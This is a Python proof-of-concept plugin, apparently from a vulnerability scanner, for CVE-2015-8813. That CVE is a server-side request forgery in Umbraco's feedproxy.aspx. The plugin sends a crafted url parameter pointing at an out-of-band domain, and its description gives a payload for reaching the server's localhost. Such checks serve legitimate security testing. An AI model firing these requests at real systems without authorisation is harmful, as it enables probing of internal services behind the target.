import requests
from plugins.oob import verify_request, gen_oob_domain



# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Umbraco SSRF Vulnerability in Feedproxy.aspx''',
        "description": '''A Server Side Request Forgery (SSRF) vulnerability in Umbraco in Feedproxy.aspx allows attackers to send arbitrary HTTP GET requests.Once you change the URL to the http://local/Umbraco/feedproxy.aspx?url=http://127.0.0.1:80/index, you able to access the localhost application of the server''',
        "severity": "high",
        "references": [
            "https://blog.securelayer7.net/umbraco-the-open-source-asp-net-cms-multiple-vulnerabilities/", 
            "https://nvd.nist.gov/vuln/detail/CVE-2015-8813"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:N",
            "cvss-score": "8.2",
            "cve-id": "CVE-2015-8813",
            "cwe-id": "CWE-918"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2015", "ssrf", "oast", "umbraco"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)
        oob_domain,flag = gen_oob_domain()
        path = '/Umbraco/feedproxy.aspx?url=http://{oob_domain}'.format(oob_domain=oob_domain)

        resp = requests.get(url+path, timeout=10, verify=False, allow_redirects=False)
        if verify_request("dns", flag):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url